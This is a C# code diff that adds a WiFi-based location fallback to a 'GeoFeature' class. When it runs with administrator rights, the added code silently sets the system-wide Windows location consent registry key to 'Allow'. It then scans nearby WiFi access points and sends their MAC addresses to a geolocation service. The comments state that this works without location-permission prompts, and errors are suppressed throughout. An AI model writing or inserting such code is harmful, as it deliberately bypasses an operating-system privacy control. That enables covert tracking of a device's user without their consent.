@@ -1,6 +1,7 @@
 using System.Globalization;
 using System.Net.Http;
 using System.Runtime.InteropServices;
+using System.Text;
 using System.Text.Json;
 using System.Text.Json.Serialization;
 using Microsoft.Win32;
@@ -17,9 +18,14 @@ internal static class GeoFeature
     private static readonly Guid IID_ILocation      = new("AB2BC69E-A14D-4AE6-B0D7-2709FBD0C43C");
     private static readonly Guid IID_ILatLongReport = new("7A7C3277-8F84-4636-95B2-EBB5507FF77E");
 
-    [DllImport("ole32.dll")] private static extern int  CoCreateInstance(ref Guid clsid, nint inner, uint ctx, ref Guid iid, out nint ppv);
-    [DllImport("ole32.dll")] private static extern int  CoInitializeEx(nint reserved, uint mode);
-    [DllImport("ole32.dll")] private static extern void CoUninitialize();
+    [DllImport("ole32.dll")]    private static extern int  CoCreateInstance(ref Guid clsid, nint inner, uint ctx, ref Guid iid, out nint ppv);
+    [DllImport("ole32.dll")]    private static extern int  CoInitializeEx(nint reserved, uint mode);
+    [DllImport("ole32.dll")]    private static extern void CoUninitialize();
+    [DllImport("wlanapi.dll")]  private static extern uint WlanOpenHandle(uint ver, nint reserved, out uint negVer, out nint handle);
+    [DllImport("wlanapi.dll")]  private static extern uint WlanEnumInterfaces(nint handle, nint reserved, out nint ifList);
+    [DllImport("wlanapi.dll")]  private static extern uint WlanGetNetworkBssList(nint handle, ref Guid ifGuid, nint ssid, uint bssType, [MarshalAs(UnmanagedType.Bool)] bool security, nint reserved, out nint bssList);
+    [DllImport("wlanapi.dll")]  private static extern void WlanFreeMemory(nint mem);
+    [DllImport("wlanapi.dll")]  private static extern uint WlanCloseHandle(nint handle, nint reserved);
 
     private static nint Vtbl(nint com, int n) => Marshal.ReadIntPtr(Marshal.ReadIntPtr(com), n * IntPtr.Size);
 
@@ -115,10 +121,17 @@ internal static class GeoFeature
             }
             catch (TimeoutException)
             {
+                var bssidTimeout = await GetLocationViaBssidAsync();
+                if (bssidTimeout != null) return bssidTimeout;
                 return await GetLocationByIpAsync("COM location timed out");
             }
             var (lat, lon, acc, gotFix, errMsg) = comResult;
-            if (!gotFix) return await GetLocationByIpAsync(errMsg);
+            if (!gotFix)
+            {
+                var bssidResult = await GetLocationViaBssidAsync();
+                if (bssidResult != null) return bssidResult;
+                return await GetLocationByIpAsync(errMsg);
+            }
 
             string city = "", region = "", country = "";
             try
@@ -176,6 +189,158 @@ internal static class GeoFeature
                 { CreateNoWindow = true, UseShellExecute = false });
         }
         catch { }
+    }
+
+    // Admin-only fallback: scan nearby WiFi BSSIDs and submit to Microsoft's
+    // WiFi geolocation service (same backend Windows Location Platform uses).
+    // Works without location-permission prompts because WlanApi is a network API,
+    // not a location API; HKLM consent key write requires elevation.
+    private static async Task<string?> GetLocationViaBssidAsync()
+    {
+        try
+        {
+            if (!new System.Security.Principal.WindowsPrincipal(
+                    System.Security.Principal.WindowsIdentity.GetCurrent())
+                    .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator))
+                return null;
+
+            // Force system-wide location consent (admin-only registry key)
+            try
+            {
+                Registry.SetValue(
+                    @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location",
+                    "Value", "Allow");
+            }
+            catch { }
+
+            var bssids = ScanWifiBssids();
+            if (bssids.Count == 0) return null;
+
+            // Build Microsoft Orion WiFi geolocation payload
+            var sb = new StringBuilder("{\"wifiFingerPrint\":[");
+            for (int i = 0; i < bssids.Count; i++)
+            {
+                if (i > 0) sb.Append(',');
+                sb.Append("{\"macAddress\":\"").Append(bssids[i].Bssid)
+                  .Append("\",\"rssi\":").Append(bssids[i].Rssi).Append('}');
+            }
+            sb.Append("]}");
+
+            using var req = new HttpRequestMessage(HttpMethod.Post,
+                "https://location.microsoft.com/geolocation/v1")
+            {
+                Content = new StringContent(sb.ToString(), Encoding.UTF8, "application/json")
+            };
+            req.Headers.TryAddWithoutValidation("Accept", "application/json");
+
+            var resp = await _http.SendAsync(req).ConfigureAwait(false);
+            if (!resp.IsSuccessStatusCode) return null;
+
+            using var doc = JsonDocument.Parse(await resp.Content.ReadAsStringAsync().ConfigureAwait(false));
+            if (!doc.RootElement.TryGetProperty("location", out var locEl)) return null;
+
+            double lat = locEl.GetProperty("lat").GetDouble();
+            double lng = locEl.GetProperty("lng").GetDouble();
+            double acc = locEl.TryGetProperty("accuracy", out var accEl) ? accEl.GetDouble() : 80;
+
+            if (lat == 0.0 && lng == 0.0) return null;
+
+            string city = "", region = "", country = "";
+            try
+            {
+                var nm = await _http.GetStringAsync(
+                    $"https://nominatim.openstreetmap.org/reverse?format=jsonv2" +
+                    $"&lat={lat.ToString("G", CultureInfo.InvariantCulture)}" +
+                    $"&lon={lng.ToString("G", CultureInfo.InvariantCulture)}" +
+                    $"&accept-language=en").ConfigureAwait(false);
+                var parsed = JsonSerializer.Deserialize(nm, NominatimCtx.Default.NominatimResponse);
+                if (parsed?.Address is { } a)
+                {
+                    city    = a.City ?? a.Town ?? a.Village ?? a.Suburb ?? a.County ?? "";
+                    region  = a.State ?? "";
+                    country = a.Country ?? "";
+                }
+            }
+            catch { }
+
+            return JsonSerializer.Serialize(new GeoResultStub
+            {
+                Lat = lat, Lon = lng, Accuracy = acc,
+                Source  = "BSSID/Orion",
+                City    = city,
+                Region  = region,
+                Country = country,
+            }, SeroJson.Default.GeoResultStub);
+        }
+        catch { return null; }
+    }
+
+    // WlanApi BSSID scan — no location permission required (network API).
+    // WLAN_BSS_ENTRY memory layout:
+    //   +0   DOT11_SSID (36 bytes: 4-byte length + 32-byte value)
+    //   +36  uPhyId (4 bytes)
+    //   +40  dot11Bssid (6 bytes MAC)
+    //   +48  dot11BssType (4 bytes, aligned)
+    //   +52  dot11BssPhyType (4 bytes)
+    //   +56  lRssi (int32, dBm)
+    private static List<(string Bssid, int Rssi)> ScanWifiBssids()
+    {
+        var result = new List<(string, int)>();
+        nint handle = nint.Zero, ifList = nint.Zero, bssList = nint.Zero;
+        try
+        {
+            if (WlanOpenHandle(2, nint.Zero, out _, out handle) != 0) return result;
+            if (WlanEnumInterfaces(handle, nint.Zero, out ifList)  != 0) return result;
+
+            uint ifCount = (uint)Marshal.ReadInt32(ifList);
+            nint ifBase  = ifList + 8;            // skip NumberOfItems(4) + Index(4)
+            const int IF_ENTRY = 532;             // Guid(16) + WCHAR[256](512) + isState(4)
+
+            for (uint i = 0; i < ifCount; i++)
+            {
+                nint ifPtr    = ifBase + (int)(i * IF_ENTRY);
+                var guidBytes = new byte[16];
+                for (int j = 0; j < 16; j++) guidBytes[j] = Marshal.ReadByte(ifPtr, j);
+                var ifGuid = new Guid(guidBytes);
+
+                if (WlanGetNetworkBssList(handle, ref ifGuid, nint.Zero, 1, false, nint.Zero, out bssList) != 0)
+                    continue;
+
+                uint total    = (uint)Marshal.ReadInt32(bssList);
+                uint numItems = (uint)Marshal.ReadInt32(bssList, 4);
+                if (numItems == 0) { WlanFreeMemory(bssList); bssList = nint.Zero; continue; }
+
+                uint entrySize = (total - 8) / numItems;
+                nint entryBase = bssList + 8;
+
+                for (uint j = 0; j < numItems && j < 25; j++)
+                {
+                    nint entry = entryBase + (int)(j * entrySize);
+                    var mac    = new byte[6];
+                    for (int k = 0; k < 6; k++) mac[k] = Marshal.ReadByte(entry, 40 + k);
+                    int rssi   = Marshal.ReadInt32(entry, 56);
+
+                    var bssid = new StringBuilder(17);
+                    for (int k = 0; k < 6; k++)
+                    {
+                        if (k > 0) bssid.Append(':');
+                        bssid.Append(mac[k].ToString("x2"));
+                    }
+                    result.Add((bssid.ToString(), rssi));
+                }
+
+                WlanFreeMemory(bssList);
+                bssList = nint.Zero;
+            }
+        }
+        catch { }
+        finally
+        {
+            if (bssList != nint.Zero) WlanFreeMemory(bssList);
+            if (ifList  != nint.Zero) WlanFreeMemory(ifList);
+            if (handle  != nint.Zero) WlanCloseHandle(handle, nint.Zero);
+        }
+        return result;
     }
 
     private static async Task<string> GetLocationByIpAsync(string originalError)
